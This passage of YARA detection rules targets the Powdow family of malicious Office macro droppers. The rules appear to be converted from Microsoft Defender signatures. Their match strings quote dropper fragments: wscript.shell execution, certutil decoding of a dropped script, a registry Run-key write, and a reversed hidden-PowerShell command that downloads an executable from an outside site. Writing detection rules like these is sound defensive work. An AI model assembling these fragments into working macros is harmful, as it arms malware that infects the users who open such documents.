        $x_1_1 = {3d 20 53 74 72 52 65 76 65 72 73 65 28 54 68 69 73 44 6f 63 75 6d 65 6e 74 2e 6b 65 79 77 6f 72 64 73 29 02 00 57 69 74 68 20 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74}  //weight: 1, accuracy: Low
        $x_1_2 = {54 68 69 73 44 6f 63 75 6d 65 6e 74 2e 73 20 53 74 72 52 65 76 65 72 73 65 28 22 6c 6c 65 68 73 2e 74 70 69 72 63 73 77 22 29 2c 20 [0-37] 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_3 = {54 68 69 73 44 6f 63 75 6d 65 6e 74 2e 73 20 53 74 72 52 65 76 65 72 73 65 28 22 6c 6c 65 22 20 2b 20 [0-32] 20 2b 20 22 72 63 73 77 22 29 2c 20 [0-32] 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-32] 29 2e 65 78 65 63 28 22 65 78 70 6c 6f 72 65 72 20 22 20 26 20 [0-32] 29 02 00 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_5 = {6b 65 79 77 6f 72 64 73 20 3d 20 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 42 75 69 6c 74 49 6e 44 6f 63 75 6d 65 6e 74 50 72 6f 70 65 72 74 69 65 73 28 22 6b 65 79 77 6f 72 64 73 22 29 2e 56 61 6c 75 65 02 00 63 6f 6e 74 65 6e 74 73 02 00 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_6 = {41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 43 6f 6e 74 65 6e 74 2e 46 69 6e 64 2e 45 78 65 63 75 74 65 20 46 69 6e 64 54 65 78 74 3a 3d 22 [0-6] 22 2c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (5 of ($x*))
}

rule TrojanDropper_O97M_Powdow_RVB_2147798902_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Powdow.RVB!MTB"
        threat_id = "2147798902"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 77 73 63 72 69 70 74 2e 73 68 65 6c 6c 22 29 0d 0a [0-10] 2e 65 78 65 63}  //weight: 1, accuracy: Low
        $x_1_2 = {22 63 3a 5c 77 69 6e 64 6f 77 73 5c 65 78 70 6c 6f 72 65 72 20 22 20 26 20 [0-10] 0d 0a 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_3 = {64 6f 63 75 6d 65 6e 74 5f 6f 70 65 6e 28 29 0d 0a 6d 61 69 6e 2e 6b 61 72 6f 6c 69 6e 65 20 28 22 22 29}  //weight: 1, accuracy: High
        $x_1_4 = ".BuiltInDocumentProperties(\"keywords\").Value)" ascii //weight: 1
        $x_1_5 = "Call ActiveDocument.Content.Find.Execute(FindText:=\"#a\", ReplaceWith:=\"\", Replace:=2)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Powdow_BTCO_2147798990_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Powdow.BTCO!MTB"
        threat_id = "2147798990"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-32] 29 2e 65 78 65 63 28 22 65 78 70 6c 6f 72 65 72 20 22 20 26 20 [0-32] 29 02 00 45 6e 64 20 46 75 6e 63 74 69 6f 6e 02 00 53 75 62 20 64 6f 63 75 6d 65 6e 74 5f 6f 70 65 6e 28 29 02 00 6d 61 69 6e 2e 6b 61 72 6f 6c 69 6e 65 20 28 22 22 29 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_2 = {41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 43 6f 6e 74 65 6e 74 2e 46 69 6e 64 2e 45 78 65 63 75 74 65 20 46 69 6e 64 54 65 78 74 3a 3d 22 [0-4] 22 2c 20 52 65 70 6c 61 63 65 57 69 74 68 3a 3d 22 22 2c 20 52 65 70 6c 61 63 65 3a 3d 32 02 00 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_3 = {54 68 69 73 44 6f 63 75 6d 65 6e 74 2e 73 20 22 77 73 63 72 69 70 74 2e 73 68 65 6c 6c 22 2c 20 [0-32] 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Powdow_RVC_2147805651_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Powdow.RVC!MTB"
        threat_id = "2147805651"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "boats = \"cm\" & \"d /\" & \"c %temp%\\instx.e\" & \"xe\"" ascii //weight: 1
        $x_1_2 = "CreateObject(placeholder2, \"\").Run container, 0" ascii //weight: 1
        $x_1_3 = {3d 20 22 73 74 2e 65 22 0d 0a 20 20 20 20 74 77 6f 6c 65 74 74 65 72 73 20 3d 20 22 78 65 22}  //weight: 1, accuracy: High
        $x_1_4 = "Sub AutoOpen()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Powdow_BTCZ_2147806292_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Powdow.BTCZ!MTB"
        threat_id = "2147806292"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 22 68 73 2e 74 70 69 22 02 00 54 68 69 73 44 6f 63 75 6d 65 6e 74 2e 73 20 53 74 72 52 65 76 65 72 73 65 28 22 6c 6c 65 22 20 2b 20 [0-32] 20 2b 20 22 72 63 73 77 22 29 2c 20 [0-32] 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_2 = {41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 43 6f 6e 74 65 6e 74 2e 46 69 6e 64 2e 45 78 65 63 75 74 65 20 46 69 6e 64 54 65 78 74 3a 3d 22 [0-4] 22 2c 20 52 65 70 6c 61 63 65 57 69 74 68 3a 3d 22 22 2c 20 52 65 70 6c 61 63 65 3a 3d 32 02 00 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_3 = {50 75 62 6c 69 63 20 46 75 6e 63 74 69 6f 6e 20 73 28 [0-32] 2c 20 [0-32] 29 02 00 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-32] 29 2e 65 78 65 63 20 22 63 3a 5c 77 69 6e 64 6f 77 73 5c 65 78 70 6c 6f 72 65 72 20 22 20 26 20 [0-32] 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Powdow_AMS_2147808556_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Powdow.AMS!MTB"
        threat_id = "2147808556"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 46 69 6e 64 2e 45 78 65 63 75 74 65 28 46 69 6e 64 54 65 78 74 3a 3d 22 [0-10] 22 2c 20 52 65 70 6c 61 63 65 57 69 74 68 3a 3d 22 22 2c 20 52 65 70 6c 61 63 65 3a 3d}  //weight: 1, accuracy: Low
        $x_1_2 = {47 65 74 4f 62 6a 65 63 74 28 22 22 2c 20 22 77 73 63 72 69 70 74 2e 73 68 65 6c 6c 22 29 2e 65 78 65 63 20 [0-10] 28 22 [0-10] 22 29 20 2b 20 22 20 22 20 2b}  //weight: 1, accuracy: Low
        $x_1_3 = {41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 53 61 76 65 41 73 32 20 46 69 6c 65 4e 61 6d 65 3a 3d [0-15] 2c 20 46 69 6c 65 46 6f 72 6d 61 74 3a 3d}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 54 72 69 6d 28 22 [0-255] 2e 68 22 20 26 20 54 68 69 73 44 6f 63 75 6d 65 6e 74 2e [0-10] 28 22 [0-10] 29 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Powdow_AMS_2147808556_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Powdow.AMS!MTB"
        threat_id = "2147808556"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {65 6e 76 69 72 6f 6e 28 [0-15] 26 22 72 22 26 [0-15] 26 22 65 22 29 26 22 5c 22 26 22 6c 22 26 22 69 6e 6b 22 26 22 73 5c 22 [0-15] 3d 61 63 74 69 76 65 77 6f 72 6b 62 6f 6f 6b 2e 62 75 69 6c 74 69 6e 64 6f 63 75 6d 65 6e 74 70 72 6f 70 65 72 74 69 65 73 2e 69 74 65 6d 28 31 30 2f 32 29}  //weight: 1, accuracy: Low
        $x_1_2 = {26 22 6c 69 6e 6b 22 2b [0-15] 2b 22 2e 70 22 2b [0-15] 2b 22 31 22 73 65 74 [0-15] 3d 63 72 65 61 74 65 6f 62 6a 65 63 74 28 22 73 63 72 69 70 74 69 6e 67 2e 66 69 6c 65 73 79 73 74 65 6d 6f 62 6a 65 63 74 22 29}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 76 62 22 2b [0-15] 3d 63 72 65 61 74 65 6f 62 6a 65 63 74 28 22 73 63 72 69 70 74 69 6e 67 2e 66 69 6c 65 73 79 73 74 65 6d 6f 62 6a 65 63 74 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = {63 72 65 61 74 65 6f 62 6a 65 63 74 28 28 72 65 70 6c 61 63 65 28 6d 6f 64 75 6c 65 31 2e [0-15] 28 22 6c 6c 65 68 73 2a 74 70 69 72 63 73 77 22 29 2c 22 2a 22 2c 22 2e 22 29}  //weight: 1, accuracy: Low
        $x_1_5 = {72 65 67 77 72 69 74 65 28 72 65 70 6c 61 63 65 28 [0-15] 28 22 [0-15] 2a 6e 75 72 2a 6e 6f 69 73 72 65 76 74 6e 65 72 72 75 63 2a 73 77 6f 64 6e 69 77 2a 74 66 6f 73 6f 72 63 69 6d 2a 65 72 61 77 74 66 6f 73 2a 72 65 73 75 5f 74 6e 65 72 72 75 63 5f 79 65 6b 68 22 29 2c 22 2a 22 2c 22 5c 22 29 29 2c 22 72 75 6e 64 6c 6c 33 32 2e 65 78 65 70 63 77 75 74 6c 2e 64 6c 6c 2c 6c 61 75 6e 63 68 61 70 70 6c 69 63 61 74 69 6f 6e 22}  //weight: 1, accuracy: Low
        $x_1_6 = {72 6f 6e 28 [0-15] 26 22 72 22 26 [0-15] 26 22 65 22 29 26 22 5c 6c 69 6e 6b 73 5c [0-15] 2e 76 62 73 22 2c 28 72 65 70 6c 61 63 65 28 [0-15] 28 [0-15] 29 2c 22 2a 22 2c 22 5f 22 29 29 65 6e 64 66 75 6e 63 74 69 6f 6e 66 75 6e 63 74 69 6f 6e [0-15] 28 [0-15] 29 [0-15] 3d 73 74 72 72 65 76 65 72 73 65 28 [0-15] 29 65 6e 64 66 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Powdow_PDE_2147808992_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Powdow.PDE!MTB"
        threat_id = "2147808992"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "=.find.execute(findtext:=\"l0v\",replacewith:=\"\",replace:=2)" ascii //weight: 1
        $x_1_2 = "=.find.execute(findtext:=\"s3x\",replacewith:=\"\",replace:=2)" ascii //weight: 1
        $x_1_3 = {3d 61 63 74 69 76 65 64 6f 63 75 6d 65 6e 74 2e 62 75 69 6c 74 69 6e 64 6f 63 75 6d 65 6e 74 70 72 6f 70 65 72 74 69 65 73 28 [0-31] 29 2e 76 61 6c 75 65}  //weight: 1, accuracy: Low
        $x_1_4 = {70 75 62 6c 69 63 66 75 6e 63 74 69 6f 6e 73 72 6e 31 28 [0-32] 29 67 65 74 6f 62 6a 65 63 74 28 22 22 2c 22 77 73 63 72 69 70 74 2e 73 68 65 6c 6c 22 29 2e 65 78 65 63 63 6f 6e 74 31 28 22 63 61 74 65 67 6f 72 79 22 29 2b 22 22 2b [0-32] 65 6e 64 66 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_5 = {70 75 62 6c 69 63 66 75 6e 63 74 69 6f 6e 73 72 6e 31 28 [0-32] 29 63 72 65 61 74 65 6f 62 6a 65 63 74 28 22 77 73 63 22 2b 63 6f 6e 74 31 28 22 63 6f 6d 70 61 6e 79 22 29 2b 22 65 6c 6c 22 29 2e 65 78 65 63 63 6f 6e 74 31 28 22 63 61 74 65 67 6f 72 79 22 29 2b 22 22 2b [0-32] 65 6e 64 66 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_6 = {3d 74 72 69 6d 28 22 [0-31] 2e 68 22 26 74 68 69 73 64 6f 63 75 6d 65 6e 74 2e 63 6f 6e 74 31 28 22 63 6f 6d 6d 65 6e 74 73 22 29 29 61 63 74 69 76 65 64 6f 63 75 6d 65 6e 74 2e 73 61 76 65 61 73 32 66 69 6c 65 6e 61 6d 65}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDropper_O97M_Powdow_RVD_2147809379_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Powdow.RVD!MTB"
        threat_id = "2147809379"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "CreateObject(\"Scripting.FileSystemObject\")" ascii //weight: 1
        $x_1_2 = "fso.CreateTextFile(\"webzoon.js\", True)" ascii //weight: 1
        $x_1_3 = "Shell(\"wscript webzoon.js\", vbNormalFocus)" ascii //weight: 1
        $x_1_4 = "strText = UserForm1.TextBox1.Text" ascii //weight: 1
        $x_1_5 = {57 6f 72 6b 62 6f 6f 6b 5f 4f 70 65 6e 28 29 0d 0a 6c 6f 6f 6d 61}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Powdow_BZYH_2147809567_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Powdow.BZYH!MTB"
        threat_id = "2147809567"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {50 75 62 6c 69 63 20 46 75 6e 63 74 69 6f 6e 20 65 78 65 63 75 74 69 76 65 28 [0-32] 29 02 00 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 77 22 20 2b 20 4a 6f 69 6e 28 53 70 6c 69 74 28 67 65 74 73 74 72 28 22 63 6f 6d 70 61 6e 79 22 29 2c 20 22 2c 22 29 2c 20 22 2e 22 29 29 2e 65 78 65 63 [0-3] 67 65 74 73 74 72 28 22 63 61 74 65 67 6f 72 79 22 29 20 2b 20 22 20 22 20 2b 20 [0-32] 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_2 = {54 72 69 6d 28 22 [0-37] 22 20 26 20 54 68 69 73 44 6f 63 75 6d 65 6e 74 2e 67 65 74 73 74 72 28 22 63 6f 6d 6d 65 6e 74 73 22 29 20 2b 20 22 41 22 29 02 00 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 53 61 76 65 41 73 32 20 46 69 6c 65 4e 61 6d 65 3a 3d [0-32] 2c 20 46 69 6c 65 46 6f 72 6d 61 74 3a 3d [0-4] 54 68 69 73 44 6f 63 75 6d 65 6e 74 2e 65 78 65 63 75 74 69 76 65 20 [0-32] 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Powdow_RDO_2147829755_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Powdow.RDO!MTB"
        threat_id = "2147829755"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {73 68 65 6c 6c 65 78 65 63 75 74 65 28 31 2c 73 74 72 72 65 76 65 72 73 65 28 22 6e 65 70 6f 22 29 2c 73 74 72 72 65 76 65 72 73 65 28 22 65 78 65 2e 6c 6c 65 68 73 72 65 77 6f 70 22 29 2c 73 74 72 72 65 76 65 72 73 65 28 22 65 78 65 2e [0-31] 5c 70 6d 65 74 5c 73 77 6f 64 6e 69 77 5c 3a 63 [0-31] 2e 00 5c 70 6d 65 74 5c 73 77 6f 64 6e 69 77 5c 3a 63 6f 2d 65 78 65 2e [0-47] 2f 6e 69 6d 64 61 2d 78 6d 61 74 7a 2f 6d 6f 63 2e 6e 72 75 74 71 65 74 2f 2f 3a 73 70 74 74 68 74 65 67 77 6e 65 64 64 69 68 65 6c 79 74 73 77 6f 64 6e 69 77 2d 22 29 2c 73 74 72 72 65 76 65 72 73 65 28 22 5c 30 2e 31 76 5c 6c 6c 65 68 73 72 65 77 6f 70 73 77 6f 64 6e 69 77 5c 32 33 6d 65 74 73 79 73 5c 73 77 6f 64 6e 69 77 5c 3a 63 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Powdow_PDPA_2147829777_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Powdow.PDPA!MTB"
        threat_id = "2147829777"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "=\"cmd/cecho\"&sbytes&\">%tmp%\\oup.dat&&certutil-decode%tmp%\\oup.dat%localappdata%\\microsoft\\office\\oup.vbs\"n" ascii //weight: 1
        $x_1_2 = "cmd/cping-n5127.0.0.1&&%localappdata%\\microsoft\\office\\oup.vbs\"n=shell(scmdline,vbhide)endsub" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Powdow_RVF_2147834392_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Powdow.RVF!MTB"
        threat_id = "2147834392"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= CreateObject(\"wSCriPT.shELl\")" ascii //weight: 1
        $x_1_2 = ".geTsPeCiaLFoLdeR(2) & \"\\L0ee7215d631c9461781835c7b8c9.exe\"" ascii //weight: 1
        $x_1_3 = "StrReverse(\" edoced- litutrec\") & Xee6c76592536852e3d7e & " ascii //weight: 1
        $x_1_4 = ".Run A98061140f3f2b0c64230e8653aa98827, 0, 1" ascii //weight: 1
        $x_1_5 = "Document_Open()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

